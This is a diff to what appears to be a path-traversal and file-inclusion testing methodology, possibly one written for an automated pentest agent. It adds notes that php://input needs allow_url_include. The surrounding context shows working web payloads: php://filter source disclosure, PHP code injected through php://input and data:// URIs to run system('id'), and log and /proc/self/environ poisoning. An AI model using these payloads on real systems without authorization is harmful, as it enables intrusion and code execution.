@@ -22,7 +22,7 @@ Load path-traversal methodology when ANY of these signals appear:
 - Archive extraction (ZIP/TAR) where filenames are not sanitized (Zip Slip)
 - Image processing libraries that follow symbolic links in archives
 - Any feature accepting a URL or file path for import/export/preview
-- PHP stream wrappers (`php://filter`, `php://input`, `phar://`, `zip://`, `data://`)
+- PHP stream wrappers (`php://filter`, `php://input` [requires `allow_url_include=On`], `phar://`, `zip://`, `data://`)
 
 ## Decision Tree
 
@@ -44,7 +44,7 @@ Load path-traversal methodology when ANY of these signals appear:
    └─ PHP: php://filter/convert.base64-encode/resource=config.php
 
 4. If direct read fails → Try LFI → RCE escalation
-     Log poisoning, php://input, data://, /proc/self/environ poisoning
+     Log poisoning, php://input (requires allow_url_include=On), data://, /proc/self/environ poisoning
 ```
 
 ## Techniques
@@ -189,7 +189,7 @@ with zipfile.ZipFile('evil.zip', 'w') as zf:
 php://filter/convert.base64-encode/resource=config.php
 
 # Write POST body as PHP code
-php://input          # POST: <?php system('id'); ?>
+php://input          # POST: <?php system('id'); ?>  (requires allow_url_include=On; off by default since PHP 5.2)
 
 # Data URI scheme
 data://text/plain,<?php system('id'); ?>
